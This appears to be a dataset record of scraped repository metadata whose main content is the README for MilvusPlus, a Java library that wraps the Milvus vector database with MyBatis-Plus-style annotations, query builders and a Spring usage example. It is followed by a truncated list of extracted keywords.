'anything', 'specifying', 'place', 'commit', 'change', 'example', 'reference', 'ticket', 'like', 'example']","['commit', 'following', 'command', 'type', 'change']",8,1,0,"['rag', 'genie', 'about', 'contribute', 'useful', 'link', 'configure', 'development', 'environment', 'install', 'verify', 'environment', 'setup', 'environment', 'build', 'execute', 'automate', 'test', 'run', 'locally', 'environment', 'variable', 'start', 'genie', 'production', 'mode', 'manage', 'local', 'database', 'manually', 'liquibase', 'usage', 'liquibase', 'table', 'update', 'frontend', 'environment', 'release', 'new', 'version', 'to', 'force', 'creation', 'patch', 'version', 'to', 'force', 'creation', 'minor', 'version', 'to', 'force', 'creation', 'major', 'version', 'to', 'force', 'creation', 'alpha', 'version', 'to', 'force', 'creation', 'beta', 'version', 'conventional', 'commits']",24,"['version', 'environment', 'to', 'force', 'creation']",1,90.0,1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.eirslett:frontend-maven-plugin,io.github.git-commit-id:git-commit-id-maven-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.liquibase:liquibase-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,13945,36.75,5.018315018315018,"['Github project -> https://github.com/stephanj/rag-genie/', 'Homebrew -> https://brew.sh/', 'installation instructions -> https://taskfile.dev/installation/', 'ASDF -> https://asdf-vm.com/', 'SDKMAN -> https://sdkman.io/', 'Homebrew -> https://brew.sh/', 'Apache Maven -> https://maven.apache.org/', 'JUnit 5 -> https://junit.org/junit5/', 'Spring Boot -> https://spring.io/projects/spring-boot', 'Spring Boot documentation -> https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config', 'http://localhost:8080 -> http://localhost:8080', 'Webpack -> https://webpack.js.org/', 'LiveReload -> https://chromewebstore.google.com/detail/livereload/jnihajbhpnppcggbcgedagnkighmdlei?hl=fr', 'Angular DevTools -> https://chromewebstore.google.com/detail/angular-devtools/ienfalfjdbdpebioblfackkekamfmbnh', 'Conventional Commits -> https://www.conventionalcommits.org/en/v1.0.0/', '**`MAJOR`** -> http://semver.org/#summary', '**`MINOR`** -> http://semver.org/#summary', '**`PATCH`** -> http://semver.org/#summary', 'Conventional Commits -> https://www.conventionalcommits.org/en/v1.0.0/', '**`MINOR`** -> http://semver.org/#summary', '**`PATCH`** -> http://semver.org/#summary', '**`MAJOR`** -> http://semver.org/#summary', 'optional scope', 'optional body']",24
dromara/MilvusPlus,main,"# MilvusPlus: Enhanced Vector Database Operations Library

## Project Introduction

<div style=""display: inline-block; border: 4px solid #ccc; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); margin: 10px; padding: 10px;"">
  <img src=""./logo/milvus.png"" alt=""MilvusPlus"" style=""border-radius: 10px;"" />
</div>

> 🔥🔥🔥 [MilvusPlus](https://milvusplus.cn/) (short for MP) is an operational tool for [Milvus](https://milvus.io), designed to simplify interactions with the Milvus vector database, providing developers with an intuitive API similar to MyBatis-Plus annotations and method call style, born to improve efficiency.

## Features

- **Non-Invasive**: It only enhances without making changes; its introduction will not affect existing projects, as smooth as silk.
- **Low Overhead**: It automatically injects basic CRUD operations upon startup, with almost no performance loss, and operates directly on objects.
- **Powerful CRUD Operations**: The universal MilvusMapper can achieve CRUD operations with just a small amount of configuration, and has a powerful condition builder to meet all kinds of usage needs.
- **Intuitive API**: The direct API design simplifies database operations, and MilvusService provides a rich API.
- **Support for Lambda-style Calls**: Lambda expressions make it easy to write various query conditions without worrying about field errors.
- **Support for Automatic Primary Key Generation**: Perfectly solves the primary key issue.
- **Support for Custom Global Operations**: Supports global method injection.
- **Annotation-based Configuration**: Uses an annotation method similar to MyBatis-Plus to configure entity models.
- **Easy to Extend**: The core design focuses on extensibility.
- **Type Safety**: Uses Java type safety to reduce errors.

## Quick Start

Custom extension support:

```
<dependency>
    <groupId>org.dromara</groupId>
    <artifactId>milvus-plus-core</artifactId>
    <version>2.1.6</version>
</dependency>
```

Spring application support:

```
<dependency>
    <groupId>org.dromara</groupId>
    <artifactId>milvus-plus-boot-starter</artifactId>
    <version>2.1.6</version>
</dependency>
```

Solon application support:

```
<dependency>
    <groupId>org.dromara</groupId>
    <artifactId>milvus-plus-solon-plugin</artifactId>
    <version>2.1.6</version>
</dependency>
```

## Notes

- Version 2.0.0 requires the use of index annotations to define indexes; otherwise, an error will occur at startup, and adding them later will be ineffective, requiring the collection to be deleted first.
- Version 2.0.0 has not yet released the MilvusService functionality.

## Configuration File

```
milvus:
  uri: https://in03-a5357975ab80da7.api.gcp-us-west1.zillizcloud.com
  token: x'x'x'x
  enable: true
  packages:
    - com.example.entity
```

- `milvus`: Defines configurations related to the Milvus service.
    - `uri`: The URI of the Milvus service, through which the application communicates with the Milvus service.
    - `token`: A token for verification and authorization, ensuring the security of access to the Milvus service.
    - `enable`: A boolean value indicating whether the Milvus module should be enabled.
    - `packages`: These packages contain Java classes corresponding to custom annotations, which you can consider as the package where your custom entity classes are located.

## Application Scenarios

- **Similarity Search**: Quickly retrieve items most similar to a given vector.
- **Recommendation System**: Recommend relevant content based on user behavior and preferences.
- **Image Retrieval**: Find the most similar images to the query image in a large-scale image library.
- **Natural Language Processing**: Convert text into vectors and perform semantic searches.
- **Bioinformatics**: Analyze and compare biological sequences, such as protein and genomic data.

## Detailed Explanation of Custom Annotations

Using custom annotations to automate the integration of the Milvus database provides the following significant advantages:

- **Simplifies the Development Process**: The database structure is declared directly in the code through annotations, without the need to manually create collections, attributes, indexes, and partitions. The project starts automatically and builds, reducing the need to manually write Milvus API calls.
- **Improves Development Efficiency**: The annotation-driven approach makes the creation and management of the database structure more convenient, speeding up development.
- **Enhances Code Readability**: Tightly integrates the definition of the database structure with business logic code, improving the readability and maintainability of the code.
- **Reduces Errors**: Automated creation of the database structure reduces the possibility of human errors, improving the stability of the system.
- **Easy to Maintain**: The use of annotations makes changes to the database structure more centralized and clear, facilitating later maintenance and upgrades.

### @ExtraParam Annotation

- **Purpose**: Defines additional parameters for indexes or other custom functions.
- **Attributes**:
    - `key()`: The key name of the parameter.
    - `value()`: The value of the parameter.

### @MilvusCollection Annotation

- **Purpose**: Defines a collection in the Milvus database.
- **Attributes**:
    - `name()`: The name of the collection.

### @MilvusField Annotation

- **Purpose**: Defines a field in the Milvus collection.
- **Attributes**:
    - `name()`: The field name, defaulting to the Java field name.
    - `dataType()`: The data type, defaulting to `FLOAT_VECTOR`.
    - `dimension()`: The vector dimension, defaulting to -1.
    - `isPrimaryKey()`: Whether it is the primary key, defaulting to false.
    - `autoID()`: Whether to automatically generate an ID, defaulting to false.
    - `description()`: The field description, defaulting to empty.
    - `elementType()`: The element type, defaulting to `None`.
    - `maxLength()`: The maximum length, defaulting to -1.
    - `maxCapacity()`: The maximum capacity, defaulting to -1.
    - `isPartitionKey()`: Whether it is a partition key, defaulting to false.

### @MilvusIndex Annotation

- **Purpose**: Defines an index in the Milvus collection.
- **Attributes**:
    - `indexType()`: The index type, defaulting to `FLAT`.
    - `metricType()`: The metric type, defaulting to `L2`.
    - `indexName()`: The index name, defaulting to empty.
    - `extraParams()`: Additional parameters, defined using the `ExtraParam` annotation.

### @MilvusPartition Annotation

- **Purpose**: Defines partitions of the Milvus collection.
- **Attributes**:
    - `name()`: An array of partition names.

Through these annotations, developers can easily define and manage the structure of the Milvus database, achieving the goal of automatically building the required database structure when the project starts.

## Detailed Explanation of Index and Metric Types

### Index Types (IndexType)

- **INVALID**: An invalid index type, used only for internal marking.
- **FLAT**: Brute force search, suitable for small-scale datasets.
- **IVF_FLAT**: Inverted file flat mode, suitable for medium-scale datasets.
- **IVF_SQ8**: Inverted file quantization mode, suitable for large-scale datasets, sacrificing accuracy for speed.
- **IVF_PQ**: Inverted file product quantization mode, suitable for large-scale high-dimensional datasets, balancing speed and accuracy.
- **HNSW**: Hierarchical navigation small-world graph, providing fast search, suitable for large-scale datasets.
- **DISKANN**: Disk-based approximate nearest neighbor search, suitable for large-scale datasets stored on disk.
- **AUTOINDEX**: Automatically selects the optimal index type.
- **SCANN**: Accelerates search using scanning and tree structures.
- **GPU_IVF_FLAT, GPU_IVF_PQ**: GPU-accelerated indexes, suitable for GPU environments.
- **BIN_FLAT, BIN_IVF_FLAT**: Dedicated index for binary vectors.
- **TRIE**: A dictionary tree index suitable for string types.
- **STL_SORT**: A sorting index suitable for scalar fields.

### Metric Types (MetricType)

- **INVALID**: An invalid metric type, used only for internal marking.
- **L2**: Euclidean distance, suitable for floating-point vectors.
- **IP**: Inner product, used for calculating cosine similarity.
- **COSINE**: Cosine similarity, suitable for text and image searches.
- **HAMMING**: Hamming distance, suitable for binary vectors.
- **JACCARD**: Jaccard similarity coefficient, suitable for set similarity calculations.

## MilvusMapper Functionality

`MilvusMapper` is a general-purpose interface for operating the Milvus database, providing a series of data manipulation methods, including querying, deleting, updating, and inserting. The following is a functional description of `MilvusMapper` and its related classes:

### MilvusMapper<T>

`MilvusMapper` is a generic abstract class that inherits from `BaseMilvusMapper`, providing basic methods for interacting with the Milvus client.

- **Get Milvus Client**: `getClient()` - Returns a `MilvusClientV2` instance.

### BaseMilvusMapper<T>

`BaseMilvusMapper` is an abstract class that defines basic operations for interacting with the Milvus database.

- **Create Search Builder Instance**: `queryWrapper()` - Creates a `LambdaQueryWrapper` instance.
- **Create Delete Builder Instance**: `deleteWrapper()` - Creates a `LambdaDeleteWrapper` instance.
- **Create Update Builder Instance**: `updateWrapper()` - Creates a `LambdaUpdateWrapper` instance.
- **Create Insert Builder Instance**: `insertWrapper()` - Creates a `LambdaInsertWrapper` instance.

#### Data Operations

- **Get Data by ID**: `getById(Serializable ... ids)`
    - **Function**: Query data based on the provided list of IDs.
    - **Parameters**: `ids` - A list of serializable IDs.
    - **Return**: `MilvusResp<List<MilvusResult<T>>>` - The response containing the query results.

- **Delete Data**: `removeById(Serializable ... ids)`
    - **Function**: Delete data based on the provided list of IDs.
    - **Parameters**: `ids` - A list of serializable IDs.
    - **Return**: `MilvusResp<DeleteResp>` - The response of the deletion operation.

- **Update Data**: `updateById(T ... entity)`
    - **Function**: Update data based on the provided entities.
    - **Parameters**: `entity` - A list of entity objects.
    - **Return**: `MilvusResp<UpsertResp>` - The response of the update operation.

- **Insert Data**: `insert(T ... entity)`
    - **Function**: Insert the provided entities into the database.
    - **Parameters**: `entity` - A list of entity objects.
    - **Return**: `MilvusResp<InsertResp>` - The response of the insertion operation.

#### Builder Methods

- **Create General Builder Instance**: `lambda(Wrapper<W, T> wrapper)` - Initializes and returns a builder instance.

### LambdaQueryWrapper<T> Class Functional Documentation

`LambdaQueryWrapper<T>` is a builder class used to construct and execute Milvus search queries. It provides a series of methods to set query parameters and ultimately execute the query.

#### Constructors

- **LambdaQueryWrapper()**: No-argument constructor.
- **LambdaQueryWrapper(String collectionName, MilvusClientV2 client, ConversionCache conversionCache, Class<T> entityType)**: Constructor that initializes the collection name, Milvus client, type conversion cache, and entity type.

#### Partition Settings

- **partition(String ... partitionName)**: Adds one or more partition names to the query.
- **partition(FieldFunction<T,?>... partitionName)**: Adds partition names based on the provided field functions.

#### Search Parameter Settings

- **searchParams(Map<String, Object> searchParams)**: Sets search parameters.

- The following are the parameters supported by searchParams and their descriptions:
    - metric_type
      Type: String
      Description: Specifies the metric type used for the search operation. It must be consistent with the metric type used when indexing vector fields.
      Optional values:
      L2: Euclidean distance, suitable for vector searches in high-dimensional spaces.
      IP: Inner product, suitable for cosine similarity searches.
      COSINE: Cosine similarity, the same as inner product, suitable for measuring the angle between vectors.
      Example:
      searchParams.put(""metric_type"", ""L2"");
    - radius
      Type: float
      Description: Sets the minimum similarity threshold for the search operation. When metric_type is set to L2, this value should be greater than range_filter; otherwise, it should be less than range_filter.
      Example:
      searchParams.put(""radius"", 0.5f);
    - range_filter
      Type: float
      Description: Limits the similarity range of the search operation. When metric_type is set to IP or COSINE, this value should be greater than radius; otherwise, it should be less than radius.
      Example:
      searchParams.put(""range_filter"", 0.3f);
      Use Example
      The following is an example of using searchParams, showing how to build a search request and set specific search parameters:

```java
Map<String, Object> searchParams = new HashMap<>();
searchParams.put(""metric_type"", ""L2"");
searchParams.put(""radius"", 0.5f);
searchParams.put(""range_filter"", 0.3f);
```

- **radius(Object radius)**: Sets the search radius.
- **rangeFilter(Object rangeFilter)**: Sets the range filter.
- **metricType(Object metric_type)**: Sets the metric type.

#### Result Settings

- **outputFields(List<String> outputFields)**: Sets the fields to be returned.
- **roundDecimal(int roundDecimal)**: Sets the number of decimal places for the returned distance values.

#### Query Condition Construction

- **eq(String fieldName, Object value)**: Adds an equal condition.
- **ne(String fieldName, Object value)**: Adds a not equal condition.
- **gt(String fieldName, Object value)**: Adds a greater than condition.
- **ge(String fieldName, Object value)**: Adds a greater than or equal condition.
- **lt(String fieldName, Object value)**: Adds a less than condition.
- **le(String fieldName, Object value)**: Adds a less than or equal condition.
- **between(String fieldName, Object start, Object end)**: Adds a range condition.
- **isNull(String fieldName)**: Adds a null check condition.
- **isNotNull(String fieldName)**: Adds a not null check condition.
- **in(String fieldName, List<?> values)**: Adds an IN condition.
- **like(String fieldName, String value)**: Adds a LIKE condition.

#### JSON and Array Operations

- **jsonContains(String fieldName, Object value)**: Adds a JSON contains condition.
- **jsonContainsAll(String fieldName, List<?> values)**: Adds a JSON contains all values condition.
- **jsonContainsAny(String fieldName, List<?> values)**: Adds a JSON contains any value condition.
- **arrayContains(String fieldName, Object value)**: Adds an array contains condition.
- **arrayContainsAll(String fieldName, List<?> values)**: Adds an array contains all values condition.
- **arrayContainsAny(String fieldName, List<?> values)**: Adds an array contains any value condition.
- **arrayLength(String fieldName, int length)**: Adds an array length condition.

#### Logical Operations

- **and(ConditionBuilder<T> other)**: Adds an AND condition.
- **or(ConditionBuilder<T> other)**: Adds an OR condition.
- **not()**: Adds a NOT condition.

#### Vector Search Settings

- **annsField(String annsField)**: Sets the vector field to be searched.
- **vector(List<?> vector)**: Adds the vector to be searched.
- **vector(String annsField, List<?> vector)**: Sets the vector field and adds the vector to be searched.
- **topK(Integer topK)**: Sets the top-k results to be returned.
- **limit(Long limit)**: Sets the limit on the number of query results.

#### Executing Queries

- **query()**: Builds and executes the search request, returning a wrapped `MilvusResp` object containing the query results.
- **query(FieldFunction<T,?> ... outputFields)**: Sets the output fields and executes the query.
- **query(String ... outputFields)**: Sets the output fields and executes the query.
- **getById(Serializable ... ids)**: Gets data by ID.

#### Helper Methods

- **buildSearch()**: Builds a complete search request object.
- **buildQuery()**: Builds a query request object.

The `LambdaQueryWrapper<T>` class provides a wealth of methods to build complex search queries, supporting various conditions, logical operations, JSON and array operations, and vector searches. By calling these methods in a chain, users can flexibly construct search requests and obtain the desired query results.

### LambdaDeleteWrapper<T>

`LambdaDeleteWrapper` is a builder class used to construct and execute deletion operations.

- **Add Partition**: `partition(String partitionName)`
- **Add Equal Condition**: `eq(String fieldName, Object value)`
- **Add Not Equal Condition**: `ne(String fieldName, Object value)`
- **Add ID to Deletion List**: `id(Object id)`

#### Executing Deletion

- **Execute Deletion**: `remove()` - Builds and executes the deletion request.
- **Delete by ID**: `removeById(Serializable ... ids)`

### LambdaUpdateWrapper<T>

`LambdaUpdateWrapper` is a builder class used to construct and execute update operations.

- **Add Partition**: `partition(String partitionName)`
- execute insertion operations.

- **Add Partition**: `partition(String partitionName)`
- **Add Field Value**: `put(String fieldName, Object value)`

#### Executing Insertion

- **Insert Data**: `insert()` - Builds and executes the insertion request.
- **Insert Multiple Data**: `insert(T ... t)`

## MilvusService Functionality

`MilvusService` is a comprehensive service that provides full management of the Milvus database. It implements multiple interfaces: `IAMService` (Identity and Access Management Service), `ICMService` (Collection Management Service), and `IVecMService` (Vector Management Service).

### Identity and Access Management (IAMService)

The `IAMService` interface provides functions for creating, deleting, querying users and roles, as well as granting and revoking permissions.

- **Create Role**: `createRole(String roleName)`
- **Create User**: `createUser(String userName, String password)`
- **Describe Role Permissions**: `describeRole(String roleName)`
- **Describe User Information**: `describeUser(String userName)`
- **Drop Role**: `dropRole(String roleName)`
- **Drop User**: `dropUser(String userName)`
- **Grant Role Permissions**: `grantPrivilege(String roleName, String objectType, String privilege, String objectName)`
- **Grant User Role**: `grantRole(String roleName, String userName)`
- **List All Roles**: `listRoles()`
- **List All Users**: `listUsers()`
- **Revoke Role Permissions**: `revokePrivilege(String roleName, String objectType, String privilege, String objectName, String databaseName)`
- **Revoke User Role**: `revokeRole(String roleName, String userName)`
- **Update User Password**: `updatePassword(String userName, String password, String newPassword)`

### Collection Management (ICMService)

The `ICMService` interface provides functions for creating, deleting, querying, renaming, and managing indexes of collections.

- **Create Collection**: `createCollection(MilvusEntity milvusEntity)`
- **Add Field**: `addField(String collectionName, AddFieldReq ... addFieldReq)`
- **Get Field**: `getField(String collectionName, String fieldName)`
- **Describe Collection**: `describeCollection(String collectionName)`
- **Drop Collection**: `dropCollection(String collectionName)`
- **Check if Collection Exists**: `hasCollection(String collectionName)`
- **Get Collection Statistics**: `getCollectionStats(String collectionName)`
- **Rename Collection**: `renameCollection(String oldCollectionName, String newCollectionName)`
- **Create Index for Collection**: `createIndex(String collectionName, List<IndexParam> indexParams)`
- **Describe Index of Collection**: `describeIndex(String collectionName, String fieldName)`
- **Drop Index of Collection**: `dropIndex(String collectionName, String fieldName)`
- **Get Loading Status of Collection or Partition**: `getLoadState(String collectionName, String partitionName)`
- **Load Collection Data into Memory**: `loadCollection(String collectionName)`
- **Release Collection Data from Memory**: `releaseCollection(String collectionName)`
- **Create Partition in Collection**: `createPartition(String collectionName, String partitionName)`
- **Drop Partition in Collection**: `dropPartition(String collectionName, String partitionName)`
- **Check if Partition Exists**: `hasPartition(String collectionName, String partitionName)`
- **List All Partitions in Collection**: `listPartitions(String collectionName)`
- **Load Partitions of Collection into Memory**: `loadPartitions(String collectionName, List<String> partitionNames)`
- **Release Partitions of Collection from Memory**: `releasePartitions(String collectionName, List<String> partitionNames)`

### Vector Management (IVecMService)

The `IVecMService` interface provides functions for inserting, updating, querying, deleting vectors, and performing similarity searches.

- **Delete Entities**: `delete(String collectionName, String partitionName, String filter, List<Object> ids)`
- **Get Entities by ID**: `get(String collectionName, String partitionName, List<Object> ids, List<String> outputFields)`
- **Insert Data**: `insert(String collectionName, List<JSONObject> data, String partitionName)`
- **Query by Scalar Filter Condition**: `query(String collectionName, List<String> partitionNames, List<String> outputFields, List<Object> ids, String filter, ConsistencyLevel consistencyLevel, long offset, long limit)`
- **Perform Vector Similarity Search**: `search(String collectionName, List<String> partitionNames, String annsField, int topK, String filter, List<String> outputFields, List<Object> data, long offset, long limit, int roundDecimal, Map<String, Object> searchParams, long guaranteeTimestamp, long gracefulTime, ConsistencyLevel consistencyLevel, boolean ignoreGrowing)`
- **Upsert Data**: `upsert(String collectionName, String partitionName, List<JSONObject> data)`

### Public Method

In addition to the above functionalities, `MilvusService` also provides a public method to obtain a `MilvusClientV2` instance:

- **Get Milvus Client**: `getClient()`

## Usage Example

Here is an example of using MilvusPlus for vector search:

Example usage:


```java

@Data
@MilvusCollection(name = ""face_collection"") // Specifies the name of the Milvus collection
public class Face {
    @MilvusField(
            name = ""person_id"", // Field Name
            dataType = DataType.Int64, // Data type is 64-bit integer
            isPrimaryKey = true // Mark as Primary Key
    )
    private Long personId; // Unique identifier of the person

    @MilvusField(
            name = ""face_vector"", // Field Name
            dataType = DataType.FloatVector, // The data type is a floating point vector
            dimension = 128 // Vector dimension, assuming that the dimension of the face feature vector is 128
    )
    @MilvusIndex(
            indexType = IndexParam.IndexType.IVF_FLAT, // Using the IVF FLAT index type
            metricType = IndexParam.MetricType.L2, // Using the L 2 Distance Metric Type
            indexName = ""face_index"", // Index Name
            extraParams = { // Specify additional index parameters
                    @ExtraParam(key = ""nlist"", value = ""100"") // For example, the nlist parameter for IVF
            }
    )
    private List<Float> faceVector; // Storing vectors of face features
}
```
```
@Component
public class FaceMilvusMapper extends MilvusMapper<Face> {
    
}

@Component
@Slf4j
public class ApplicationRunnerTest implements ApplicationRunner {
    private final FaceMilvusMapper mapper;

    public ApplicationRunnerTest(FaceMilvusMapper mapper) {
        this.mapper = mapper;
    }

    @Override
    public void run(ApplicationArguments args){
        Face face=new Face();
        List<Float> vector = new ArrayList<>();
        for (int i = 0; i < 128; i++) {
            vector.add((float) (Math.random() * 100)); // Using random numbers here as an example only
        }
        face.setPersonId(1l);
        face.setFaceVector(vector);
        
        // add
        List<Face> faces=new ArrayList<>();
        for (int i = 1; i < 10 ;i++){
            Face face1=new Face();
            face1.setPersonId(Long.valueOf(i));
            List<Float> vector1 = new ArrayList<>();
            for (int j = 0; j < 128; j++) {
                vector1.add((float) (Math.random() * 100)); // Using random numbers here as an example only
            }
            face1.setFaceVector(vector1);
            faces.add(face1);
        }
        MilvusResp<InsertResp> insert = mapper.insert(faces.toArray(faces.toArray(new Face[0]))); log.info(""insert--{}"", JSONObject.toJSONString(insert));
        
        // id query
        MilvusResp<List<MilvusResult<Face>>> query = mapper.getById(9l);
        log.info(""query--getById---{}"", JSONObject.toJSONString(query));
        
        // VECTOR QUERY
        MilvusResp<List<MilvusResult<Face>>> query1 = mapper.queryWrapper()
                .vector(Face::getFaceVector, vector)
                .ne(Face::getPersonId, 1L)
                .topK(3)
                .query();
        log.info(""VectorQuery query--queryWrapper---{}"", JSONObject.toJSONString(query1));
        
        // SCALAR QUERY
        MilvusResp<List<MilvusResult<Face>>> query2 = mapper.queryWrapper()
                .eq(Face::getPersonId, 2L)
                .limit(3)
                .query();
        log.info(""ScalarQuery   query--queryWrapper---{}"", JSONObject.toJSONString(query2));
        
        // update
        vector.clear();
        for (int i = 0; i < 128; i++) {
            vector.add((float) (Math.random() * 100)); // Using random numbers here as an example only
        }
        MilvusResp<UpsertResp> update = mapper.updateById(face);log.info(""update--{}"", JSONObject.toJSONString(update));
        
        // id Query
        MilvusResp<List<MilvusResult<Face>>> query3 = mapper.getById(1L);log.info(""query--getById---{}"", JSONObject.toJSONString(query3));
        
        // del
        MilvusResp<DeleteResp> remove = mapper.removeById(1L);log.info(""remove--{}"", JSONObject.toJSONString(remove));
        
        // query
        MilvusResp<List<MilvusResult<Face>>> query4 = mapper.getById(1L);log.info(""query--{}"", JSONObject.toJSONString(query4));

    }
}
```

## Contributing

Contributions are welcome!

- Report issues or suggest features by [opening an issue](https://github.com/yourusername/MilvusPlus/issues/new).
- Submit changes by [creating a pull request](https://github.com/yourusername/MilvusPlus/compare).

## License

MilvusPlus is open source and available under the [License](https://github.com/yourusername/MilvusPlus/blob/master/LICENSE).

## Contact

For questions or support, reach out to [javpower@163.com](mailto:javpower@163.com).
",0,1,1,apache-2.0,4.0,"['milvusplus', 'enhanced', 'vector', 'database', 'operation', 'library', 'project', 'introduction', 'milvusplus', 'short', 'mp', 'operational', 'tool', 'milvus', 'designed', 'simplify', 'interaction', 'milvus', 'vector', 'database', 'providing', 'developer', 'intuitive', 'api', 'similar', 'annotation', 'method', 'call', 'style', 'born', 'improve', 'efficiency', 'feature', 'enhances', 'without', 'making', 'change', 'introduction', 'affect', 'existing', 'project', 'smooth', 'silk', 'low', 'overhead', 'automatically', 'injects', 'basic', 'crud', 'operation', 'upon', 'startup', 'almost', 'performance', 'loss', 'operates', 'directly', 'object', 'powerful', 'crud', 'operation', 'universal', 'milvusmapper', 'achieve', 'crud', 'operation', 'small', 'amount', 'configuration', 'powerful', 'condition', 'builder', 'meet', 'kind', 'usage', 'need', 'intuitive', 'api', 'direct', 'api', 'design', 'simplifies', 'database', 'operation', 'milvusservice', 'provides', 'rich', 'api', 'support', 'call', 'lambda', 'expression', 'make', 'easy', 'write', 'various', 'query', 'condition', 'without', 'worrying', 'field', 'error', 'support', 'automatic', 'primary', 'key', 'generation', 'perfectly', 'solves', 'primary', 'key', 'issue', 'support', 'custom', 'global', 'operation', 'support', 'global', 'method', 'injection', 'configuration', 'us', 'annotation', 'method', 'similar', 'configure', 'entity', 'model', 'easy', 'extend', 'core', 'design', 'focus', 'extensibility', 'type', 'safety', 'us', 'java', 'type', 'safety', 'reduce', 'error', 'quick', 'start', 'custom', 'extension', 'support', 'spring', 'application', 'support', 'solon', 'application', 'support', 'note', 'version', 'requires', 'use', 'index', 'annotation', 'define', 'index', 'otherwise', 'error', 'occur', 'startup', 'adding', 'later', 'ineffective', 'requiring', 'collection', 'deleted', 'first', 'version', 'yet', 'released', 'milvusservice', 'functionality', 'configuration', 'file', 'defines', 'configuration', 'related', 'milvus', 'service', 'uri', 'milvus', 'service', 'application', 'communicates', 'milvus', 'service', 'token', 'verification', 'authorization', 'ensuring', 'security', 'access', 'milvus', 'service', 'boolean', 'value', 'indicating', 'whether', 'milvus', 'module', 'enabled', 'package', 'contain', 'java', 'class', 'corresponding', 'custom', 'annotation', 'consider', 'package', 'custom', 'entity', 'class', 'located', 'application', 'scenario', 'similarity', 'search', 'quickly', 'retrieve', 'item', 'similar', 'given', 'vector', 'recommendation', 'system', 'recommend', 'relevant', 'content', 'based', 'user', 'behavior', 'preference', 'image', 'retrieval', 'find', 'similar', 'image', 'query', 'image', 'image', 'library', 'natural', 'language', 'processing', 'convert', 'text', 'vector', 'perform', 'semantic', 'search', 'bioinformatics', 'analyze', 'compare', 'biological', 'sequence', 'protein', 'genomic', 'data', 'detailed', 'explanation', 'custom', 'annotation', 'using', 'custom', 'annotation', 'automate', 'integration', 'milvus', 'database', 'provides', 'following', 'significant', 'advantage', 'simplifies', 'development', 'process', 'database', 'structure', 'declared', 'directly', 'code', 'annotation', 'without', 'need', 'manually', 'create', 'collection', 'attribute', 'index', 'partition', 'project', 'start', 'automatically', 'build', 'reducing', 'need', 'manually', 'write', 'milvus', 'api', 'call', 'improves', 'development', 'efficiency', 'approach', 'make', 'creation', 'management', 'database', 'structure', 'convenient', 'speeding', 'development', 'enhances', 'code', 'readability', 'tightly', 'integrates', 'definition', 'database', 'structure', 'business', 'logic', 'code', 'improving', 'readability', 'maintainability', 'code', 'reduces', 'error', 'automated', 'creation', 'database', 'structure', 'reduces', 'possibility', 'human', 'error', 'improving', 'stability', 'system', 'easy', 'maintain', 'use', 'annotation', 'make', 'change', 'database', 'structure', 'centralized', 'clear', 'facilitating', 'later', 'maintenance', 'upgrade', 'extraparam', 'annotation', 'purpose', 'defines', 'additional', 'parameter', 'index', 'custom', 'function', 'attribute', 'key', 'name', 'parameter', 'value', 'parameter', 'milvuscollection', 'annotation', 'purpose', 'defines', 'collection', 'milvus', 'database', 'attribute', 'name', 'collection', 'milvusfield', 'annotation', 'purpose', 'defines', 'field', 'milvus', 'collection', 'attribute', 'field', 'name', 'defaulting', 'java', 'field', 'name', 'data', 'type', 'defaulting', 'vector', 'dimension', 'defaulting', 'whether', 'primary', 'key', 'defaulting', 'false', 'whether', 'automatically', 'generate', 'id', 'defaulting', 'false', 'field', 'description', 'defaulting', 'empty', 'element', 'type', 'defaulting', 'maximum', 'length', 'defaulting', 'maximum', 'capacity', 'defaulting', 'whether', 'partition', 'key', 'defaulting', 'false', 'milvusindex', 'annotation', 'purpose', 'defines', 'index', 'milvus', 'collection', 'attribute', 'index', 'type', 'defaulting', 'metric', 'type', 'defaulting', 'index', 'name', 'defaulting', 'empty', 'additional', 'parameter', 'defined', 'using', 'annotation', 'milvuspartition', 'annotation', 'purpose', 'defines', 'partition', 'milvus', 'collection', 'attribute', 'array', 'partition', 'name', 'annotation', 'developer', 'easily', 'define', 'manage', 'structure', 'milvus', 'database', 'achieving', 'goal', 'automatically', 'building', 'required', 'database', 'structure', 'project', 'start', 'detailed', 'explanation', 'index', 'metric', 'type', 'index', 'type', 'indextype', 'invalid', 'invalid', 'index', 'type', 'used', 'internal', 'marking', 'flat', 'brute', 'force', 'search', 'suitable', 'datasets', 'inverted', 'file', 'flat', 'mode', 'suitable', 'datasets', 'inverted', 'file', 'quantization', 'mode', 'suitable', 'datasets', 'sacrificing', 'accuracy', 'speed', 'inverted', 'file', 'product', 'quantization', 'mode', 'suitable', 'datasets', 'balancing', 'speed', 'accuracy', 'hnsw', 'hierarchical', 'navigation', 'graph', 'providing', 'fast', 'search', 'suitable', 'datasets', 'diskann', 'approximate', 'nearest', 'neighbor', 'search', 'suitable', 'datasets', 'stored', 'disk', 'autoindex', 'automatically', 'selects', 'optimal', 'index', 'type', 'scann', 'accelerates', 'search', 'using', 'scanning', 'tree', 'structure', 'index', 'suitable', 'gpu', 'environment', 'dedicated', 'index', 'binary', 'vector', 'trie', 'dictionary', 'tree', 'index', 'suitable', 'string', 'type', 'sorting', 'index', 'suitable', 'scalar', 'field', 'metric', 'type', 'metrictype', 'invalid', 'invalid', 'metric', 'type', 'used', 'internal', 'marking', 'euclidean', 'distance', 'suitable', 'vector', 'ip', 'inner', 'product', 'used', 'calculating', 'cosine', 'similarity', 'cosine', 'cosine', 'similarity', 'suitable', 'text', 'image', 'search', 'hamming', 'hamming', 'distance', 'suitable', 'binary', 'vector', 'jaccard', 'jaccard', 'similarity', 'coefficient', 'suitable', 'set', 'similarity', 'calculation', 'milvusmapper', 'functionality', 'interface', 'operating', 'milvus', 'database', 'providing', 'series', 'data', 'manipulation', 'method', 'including', 'querying', 'deleting', 'updating', 'inserting', 'following', 'functional', 'description', 'related', 'class', 'milvusmapper', 'generic', 'abstract', 'class', 'inherits', 'providing', 'basic', 'method', 'interacting', 'milvus', 'client', 'get', 'milvus', 'client', 'returns', 'instance', 'basemilvusmapper', 'abstract', 'class', 'defines', 'basic', 'operation', 'interacting', 'milvus', 'database', 'create', 'search', 